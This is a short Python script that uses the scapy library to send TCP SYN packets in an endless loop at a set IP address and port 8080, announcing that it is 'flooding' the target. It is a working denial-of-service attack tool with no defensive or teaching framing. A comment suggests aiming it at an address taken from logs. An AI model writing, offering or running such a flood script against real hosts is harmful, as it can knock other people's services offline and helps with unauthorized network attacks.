# Run this: pip install scapy
from scapy.all import IP, TCP, send
import sys

target_ip = "192.168.1.3"  # Change this to match what you saw in your logs # or your local IP
target_port = 8080

print(f"Flooding {target_ip} with SYN packets...")
p = IP(dst=target_ip)/TCP(dport=target_port, flags="S")
send(p, loop=1, inter=0.01) # Sends packets rapidly